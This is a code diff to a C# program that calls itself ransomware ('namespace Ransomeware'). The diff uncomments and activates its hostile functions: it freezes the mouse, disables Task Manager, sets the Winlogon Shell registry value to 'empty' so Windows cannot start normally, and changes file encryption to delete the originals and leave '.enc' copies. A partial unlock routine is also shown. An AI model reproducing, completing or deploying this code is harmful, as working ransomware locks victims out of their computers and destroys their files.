@@ -53,9 +53,9 @@ namespace Ransomeware
                 RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                 //Repair shell
-                //RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
-                //reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
-
+                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
+                
                 OFF_Encrypt(); //decrypt all encrypt files
 
                 //kill ransomware
@@ -83,7 +83,7 @@ namespace Ransomeware
             Location = new Point(-100, -100);
 
             //Freeze mouse
-           //FreezeMouse(); 
+           FreezeMouse(); 
 
 
             //Disable taskmanager
@@ -95,8 +95,8 @@ namespace Ransomeware
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
 
             //If you shutdown your computer, you can't run winodws well
-           //RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
-            //reg3.SetValue("Shell", "empty", RegistryValueKind.String);
+           RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+            reg3.SetValue("Shell", "empty", RegistryValueKind.String);
 
             //define for desktop path
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); 
@@ -244,8 +244,8 @@ namespace Ransomeware
                     passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                     byte[] bytesEncrypted = Cipher.Encrypt(bytesToBeEncrypted, passwordBytes, 16);
 
-                    string fileEncrypted = file;
-
+                    string fileEncrypted = file + ".enc";
+                    File.Delete(file);
                     File.WriteAllBytes(fileEncrypted, bytesEncrypted);
                 }
                 catch (Exception e)
@@ -322,7 +322,8 @@ namespace Ransomeware
 
                     byte[] bytesDecrypted = Cipher.Decrypt(bytesToBeDecrypted, passwordBytes, 16);
 
-                    string file = fileEncrypted;
+                    string file = fileEncrypted.Replace(".enc","");
+                    File.Delete(fileEncrypted);
                     File.WriteAllBytes(file, bytesDecrypted);
                 }
                 catch (Exception e)
